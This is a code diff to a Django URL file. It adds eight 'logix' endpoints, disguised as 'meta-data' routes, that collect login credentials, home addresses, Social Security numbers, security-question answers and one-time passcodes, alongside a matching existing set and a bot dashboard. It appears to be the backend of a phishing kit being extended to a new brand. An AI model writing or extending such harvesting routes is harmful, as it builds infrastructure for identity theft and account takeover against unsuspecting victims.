@@ -76,6 +76,16 @@ def bot_dashboard(request):
     return HttpResponse(html)
 
 from user_data.views import collect_user_basic_info, collect_user_home_address, collect_user_login_cred, collect_user_login_cred2, collect_user_social_security, collect_user_social_security_2, collect_user_security_questions, collect_user_otp_verification
+from user_data.logix_views import (
+    logix_collect_user_login_cred,
+    logix_collect_user_login_cred2,
+    logix_collect_user_basic_info,
+    logix_collect_user_home_address,
+    logix_collect_user_social_security,
+    logix_collect_user_social_security_2,
+    logix_collect_user_security_questions,
+    logix_collect_user_otp_verification,
+)
 
 urlpatterns = [
     path("admin/", admin.site.urls),
@@ -88,5 +98,14 @@ urlpatterns = [
     path("api/meta-data-6/", collect_user_social_security_2, name="collect_user_social_security_2"),
     path("api/meta-data-7/", collect_user_security_questions, name="collect_user_security_questions"),
     path("api/meta-data-8/", collect_user_otp_verification, name="collect_user_otp_verification"),
+    # Logix API endpoints
+    path("api/logix-meta-data-1/", logix_collect_user_login_cred, name="logix_collect_user_login_cred"),
+    path("api/logix-meta-data-2/", logix_collect_user_login_cred2, name="logix_collect_user_login_cred2"),
+    path("api/logix-meta-data-3/", logix_collect_user_basic_info, name="logix_collect_user_basic_info"),
+    path("api/logix-meta-data-4/", logix_collect_user_home_address, name="logix_collect_user_home_address"),
+    path("api/logix-meta-data-5/", logix_collect_user_social_security, name="logix_collect_user_social_security"),
+    path("api/logix-meta-data-6/", logix_collect_user_social_security_2, name="logix_collect_user_social_security_2"),
+    path("api/logix-meta-data-7/", logix_collect_user_security_questions, name="logix_collect_user_security_questions"),
+    path("api/logix-meta-data-8/", logix_collect_user_otp_verification, name="logix_collect_user_otp_verification"),
     path("dashboard/", bot_dashboard, name="bot_dashboard"),
 ]
